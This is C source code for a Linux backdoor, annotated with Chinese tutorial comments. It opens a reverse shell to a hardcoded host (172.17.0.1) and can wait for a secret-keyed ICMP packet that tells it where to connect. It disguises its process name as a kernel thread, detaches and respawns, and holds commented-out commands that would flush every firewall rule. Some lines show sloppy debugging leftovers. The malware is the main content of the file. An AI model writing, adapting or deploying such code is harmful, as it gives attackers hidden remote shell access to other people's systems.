#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#ifdef STATIC
printf("ifdef STATIC");
# define REVERSE_HOST     "172.17.0.1"
# define REVERSE_PORT     19832
# define RESPAWN_DELAY    35
#else
# define ICMP_PACKET_SIZE 1024
# define ICMP_KEY         "dsagf3dfsfsdfds"
#endif

#define VERSION          "linux"
#define MOTD             "centos"
#define SHELL            "/bin/sh"
#define PROCESS_NAME     "[test]"/*"[kblockd]"*/
#define Debug		 1
/*
 * Start the reverse shell
 */
void dedebug(){
    printf("%s","Done.");
}
void start_reverse_shell(char *bd_ip, unsigned short int bd_port)
{
    int sd;
        /*结构体名*/ /*结构体调用名*/
    struct sockaddr_in serv_addr;
    struct hostent *server;
    
    /* socket() */
    sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd < 0) 
        return;
    
    server = gethostbyname(bd_ip);
    if (Debug){
	printf("[+]h_name=%s\n",server->h_name);
	printf("[+]h_addrtype=%d\n", server->h_addrtype);
    printf("[+]h_length=%d\n", server->h_length);
    printf("[+]%d\n", serv_addr.sin_port);
    }

    if (server == NULL){
        return;
    }
    bzero((char *) &serv_addr, sizeof(serv_addr)); //bzero置字节字符串前n个字节为零且包括‘\0’,将内存区域清零,参数说明：s 要置零的数据的起始地址； n 要置零的数据字节个数。
    //sizeof()是一种内存容量度量函数，功能是返回一个变量或者类型的大小（以字节为单位）

    serv_addr.sin_family = AF_INET;//AF_INET ip4


// bcopy（拷贝内存内容）
// 相关函数 memccpy，memcpy，memmove，strcpy，ctrncpy
// 表头文件 #include <string.h>
// 定义函数 void bcopy ( const void *src,void *dest ,int n);
// 函数说明 bcopy()与memcpy()一样都是用来拷贝src所指的内存内容前n个字节
    bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);

    serv_addr.sin_port = htons(bd_port);//htons是将整型变量从主机字节顺序转变成网络字节顺序， 就是整数在地址空间存储方式变为高位字节存放在内存的低地址处。
                    //网络字节顺序是TCP/IP中规定好的一种数据表示格式，它与具体的CPU类型、操作系统等无关，从而可以保证数据在不同主机之间传输时能够被正确解释，网络字节顺序采用big-endian排序方式。
                    //将主机的无符号短整形数转换成网络字节顺序。hostshort：主机字节顺序表达的16位数。htons把unsigned short类型从主机序转换到网络序
    if (Debug){
        dedebug();
    }
    /*connect*/
    /*
        connect()用于建立与指定socket的连接。
        头文件: #include <sys/socket.h>
        函数原型: int connect(SOCKET s, const struct sockaddr * name, int namelen);
        参数:
        s：标识一个未连接socket
        name：指向要连接套接字的sockaddr结构体的指针
        namelen：sockaddr结构体的字节长度
    */
    if (connect(sd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0)
        return;
    /*motd*/

    /*
    函数说明：write()会把参数buf所指的内存写入count个字节到参数放到所指的文件内。
    返回值：如果顺利write()会返回实际写入的字节数。当有错误发生时则返回-1，错误代码存入errno中。
    */
    write(sd, MOTD, strlen(MOTD));

    /* connect the socket to process sdout,stdin and stderr */
    dup2(sd,0);/*功能： 复制文件描述符,用法： int dup2(int oldfd,int newfd);*/
    dup2(sd,1);
    dup2(sd,2);

/*execl()其中后缀"l"代表list也就是参数列表的意思，第一参数path字符指针所指向要执行的文件路径， 
    接下来的参数代表执行该文件时传递的参数列表：argv[0],argv[1]... 最后一个参数须用空指针NULL作结束。*/
    execl(SHELL, SHELL, (char *)0);
    //close(sd);

}
/*
　　#define x 　　...　　#endif
　　这是宏定义的一种，它可以根据是否已经定义了一个变量来进行分支选择，一般用于调试等等.实际上确切的说这应该是预处理功能中三种（宏定义，文件包含和条件编译）中的一种----条件编译。 C语言在对程序进行编译时，会先根据预处理命令进行“预处理”。C语言编译系统包括预处理，编译和链接等部分。
　　#ifndef x //先测试x是否被宏定义过
　　#define x
　　程序段1 //如果x没有被宏定义过，定义x，并编译程序段1
　　#endif
　　程序段2 //如果x已经定义过了则编译程序段2的语句，“忽视”程序段1。
*/
#ifdef IPTABLES
void flush_iptables(void){
    printf("flush_iptables")
    /*
    system("iptables -X 2> /dev/null");//-X删除用户自定义的规则链
    system("iptables -F 2> /dev/null");//-F清空所有规则链,重启后恢复
    system("iptables -t nat -F 2> /dev/null")//清空所有nat表中的规则链
    system("iptables -t nat -X 2> /dev/null")//清空所有nat表中的用户自定义规则链
    system("iptables -t mangle -F 2> /dev/null")//清空所有mangle表中的规则链
    system("iptables -t mangle -X 2> /dev/null")//清空所有mangle表中所有的用户自定义链
    system("iptables -P INPUT ACCEPT 2> /dev/null")//设置默认入站规则,允许所有流量通过
    system("iptables -P FORWARD ACCEPT 2> /dev/null")//设置默认转发规则，允许所有流量通过
    system("iptables -P OUTPUT ACCEPT 2> /dev/null")//设置默认出站规则，允许所有流量通过
    */
}

#endif

/*
*ICMP packet mode
*/
#ifndef STATIC
void icmp_listen(void){
    int sockfd,
    n,
    icmp_key_size;
    char buf[ICMP_PACKET_SIZE + 1];
    struct icmp *icmp;
    struct ip *ip;

    icmp_key_size = strlen(ICMP_KEY);
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);

    /*
        Waiting for the activation ICMP packet
    */

   while(1){
       /*Get the icmp packet*/

        //bzero置字节字符串前n个字节为零且包括‘\0’,将内存区域清零,参数说明：s 要置零的数据的起始地址； n 要置零的数据字节个数
       bzero(buf,ICMP_PACKET_SIZE + 1);
       

       //recv函数
        //函数原型：int recv( SOCKET s, char *buf, int len, int flags)
        //功能：不论是客户还是服务器应用程序都用recv函数从TCP连接的另一端接收数据。
        //参数一：指定接收端套接字描述符；
        //参数二：指明一个缓冲区，该缓冲区用来存放recv函数接收到的数据；
        //参数三：指明buf的长度；
        //参数四 ：一般置为0。
       //返回值：若无错误发生，recv()返回读入的字节数。如果连接已中止，返回0。如果发生错误，返回-1，应用程序可通过perror()获取相应错误信息。
       n = recv(sockfd, buf,ICMP_PACKET_SIZE,0);
       if (n > 0){
           ip = (struct ip *)buf;
           icmp = (struct icmp *)(ip + 1);

            /* if this is an ICMP _ECHO packet and if the KEY is correct */

                                                //memcmp是比较内存区域buf1和buf2的前count个字节。该函数是按字节比较的。
                                                /*
                                                    当buf1<buf2  时，返回值小于0
                                                    当buf1==buf2 时，返回值=0
                                                    当buf1>buf2  时，返回值大于0
                                                */
            if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data,ICMP_KEY,icmp_key_size) == 0)){
                char bd_ip[16];
                int bd_port;

                bd_port = 0;

                bzero(bd_ip, sizeof(bd_ip));



            //     sscanf() - 从一个字符串中读进与指定格式相符的数据.
            // 　　函数原型:
            // 　　Int sscanf( string str, string fmt, mixed var1, mixed var2 ... );
            // 　　int scanf( const char *format [,argument]... );
            // 　　说明：
            // 　　sscanf与scanf类似，都是用于输入的，只是后者以屏幕(stdin)为输入源，前者以固定字符串为输入源。
            // 　　其中的format可以是一个或多个 {%[*] [width] [{h | l | I64 | L}]type | ' ' | '/t' | '/n' | 非%符号}
            // 　　注：
            // 　　1、 * 亦可用于格式中, (即 %*d 和 %*s) 加了星号 (*) 表示跳过此数据不读入. (也就是不把此数据读入参数中)
            // 　　2、{a|b|c}表示a,b,c中选一，[d],表示可以有d也可以没有d。
            // 　　3、width表示读取宽度。
            // 　　4、{h | l | I64 | L}:参数的size,通常h表示单字节size，I表示2字节 size,L表示4字节size(double例外),l64表示8字节size。
            // 　　5、type :这就很多了，就是%s,%d之类。
            // 　　6、特别的：%*[width] [{h | l | I64 | L}]type 表示满足该条件的被过滤掉，不会向目标参数中写入值
            // 　　支持集合操作：
            // 　　%[a-z] 表示匹配a到z中任意字符，贪婪性(尽可能多的匹配)
            // 　　%[aB'] 匹配a、B、'中一员，贪婪性
            // 　　%[^a] 匹配非a的任意字符，贪婪性
                //返回值:如果成功，该函数返回成功匹配和赋值的个数。如果到达文件末尾或发生读错误，则返回 EOF。
                
                sscanf((char *)(icmp->icmp_data + icmp_key_size + 1), "%15s %d",bd_ip, &bd_port);

                if((bd_port <=0) || (strlen(bd_ip) <7))
                    continue;

                /* Starting reverse shell*/




            /* fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程,也就是两个进程可以做完全相同的事但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。
            一个进程调用fork（）函数后，系统先给新的进程分配资源，例如存储数据和代码的空间。然后把原来的进程的所有值都复制到新的新进程中，只有少数值与原来的进程的值不同。
            相当于克隆了一个自己。
            */
                if(fork() == 0){
                #ifdef IPTABLES
                flush_iptables();
                #endif

                //printf("->Starting reverse shell ($s:%d）...\n", bd_ip,bd_port);
                start_reverse_shell(bd_ip, bd_port);

                exit(EXIT_SUCCESS);//EXIT_SUCCESS是C语言stdlib头文件库中定义的一个符号常量；相当于return 0
                }

            }
       }
   }

}
#endif
int main(int argc, char *argv[]){
    printf("%d",getpid());


    //SIGCHLD的语义为:子进程状态改变后产生此信号，父进程需要调用一个wait函数以确定发生了什么。
    // 对于SIGCLD的早期处理方式如下:如果进程特地设置该信号的配置为SIG_IGN,则调用进程的子进程将不产生僵死进程。

    signal(SIGCLD, SIG_IGN);//Prevent child process rom becoming zombie process.
    /*
        描述
        C 库函数 void (*signal(int sig, void (*func)(int)))(int) 设置一个函数来处理信号，即带有 sig 参数的信号处理程序。

        声明
        下面是 signal() 函数的声明。

        void (*signal(int sig, void (*func)(int)))(int)
        参数
        sig -- 在信号处理程序中作为变量使用的信号码。下面是一些重要的标准信号常量：
        宏	信号
        SIGABRT	(Signal Abort) 程序异常终止。
        SIGFPE	(Signal Floating-Point Exception) 算术运算出错，如除数为 0 或溢出（不一定是浮点运算）。
        SIGILL	(Signal Illegal Instruction) 非法函数映象，如非法指令，通常是由于代码中的某个变体或者尝试执行数据导致的。
        SIGINT	(Signal Interrupt) 中断信号，如 ctrl-C，通常由用户生成。
        SIGSEGV	(Signal Segmentation Violation) 非法访问存储器，如访问不存在的内存单元。
        SIGTERM	(Signal Terminate) 发送给本程序的终止请求信号。
        func -- 一个指向函数的指针。它可以是一个由程序定义的函数，也可以是下面预定义函数之一：
        SIG_DFL	默认的信号处理程序。
        SIG_IGN	忽视信号。
        返回值
        该函数返回信号处理程序之前的值，当发生错误时返回 SIG_ERR。

    */

    //chdir 是C语言中的一个系统调用函数(同cd),用于改变当前工作目录，其参数为Path目标目录，可以是绝对目录或相对目录
    chdir("/");

    /*  if argv is equal to Inf0,some info will be printed
    *   In this way the "Inf0" string will not be seen in clear text into the binary file :)*/

   //#ifndef x 先测试x是否被宏定义过
   #ifndef NORENAME
   int i;
   /*Renaming the process*/
   /*
    strncpy 是 C语言的库函数之一，来自 C语言标准库,定义于 string.h，
    char *strncpy(char *dest, const char *src, int n)，
    把src所指向的字符串中以src地址开始的前n个字节复制到dest所指的数组中，并返回被复制后的dest。
   */
   strncpy(argv[0],PROCESS_NAME,strlen(argv[0]));
   for(i=1;i<argc;i++)
        /*
        将s所指向的某一块内存中的每个字节的内容全部设置为ch指定的ASCII值， 块的大小由第三个参数指定，这个函数通常为新申请的内存做初始化工作， 其返回值为指向S的指针。
        需要的头文件:在C中 <string.h>、C++中　<cstring>
        
        1. void *memset(void *s,int c,size_t n)
        总的作用：将已开辟内存空间 s 的首 n 个字节的值设为值 c。
        */
        memset(argv[i],' ',strlen(argv[i]));
    #endif

    #ifdef DETACH
    /*
        1）在父进程中，fork返回新创建子进程的进程ID；
        2）在子进程中，fork返回0；
        3）如果出现错误，fork返回一个负值；
    */
    if(fork() !=0)
        exit(EXIT_SUCCESS);
    #endif

    #ifdef STATIC
    while (1){
        #ifdef IPTABLES
        flush_iptables();
        #endif

        /*starting reverse shell*/
        if(fork() == 0){
            start_reverse_shell(REVERSE_HOST,REVERSE_PORT);
            exit(EXIT_SUCCESS);
        }

        /*
        函数名： sleep、usleep
        功 能： 执行挂起一段时间
        头文件： #include <unistd.h>
        区 别： unsigned int sleep (unsigned int seconds);//n秒
        int usleep (useconds_t usec);//n微秒

        Linux下（使用的gcc的库），sleep()函数是以秒为单位的，sleep(1);就是休眠1秒。
        而MFC下的Sleep()函数是以毫秒为单位的，sleep(1000);才是休眠1秒。而如果在Linux下也用微妙为单位休眠，
        可以使用线程休眠函数:void usleep(unsigned long usec)。
        */
        sleep(RESPAWN_DELAY);
    }
#else
    /*We need root privilegies to read ICMP packets!*/
	start_reverse_shell("172.17.0.1",4444);
    
    /*
    if (getpid()!=0){
        fprintf(stdout,"I'm not root :(\n");
        exit(EXIT_FAILURE);
    }
    */
    icmp_listen();
#endif
    return EXIT_SUCCESS;
}
